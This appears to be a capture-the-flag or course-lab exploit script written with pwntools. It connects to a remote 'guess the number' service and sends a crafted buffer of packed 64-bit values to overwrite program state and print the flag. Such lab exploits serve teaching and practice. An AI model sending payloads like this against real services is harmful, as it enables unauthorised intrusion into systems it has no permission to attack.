from pwn import *

host = 'aup.zoolab.org'
port = 38156
r = remote(host, port)
# = process('./guess1')

payload = p64(1) * 4 + p64(0) * 60 + p64(1) * 4

r.recvuntil('Guess the number:', timeout=1)
r.sendline(payload)
print(r.recvuntil('}').decode())
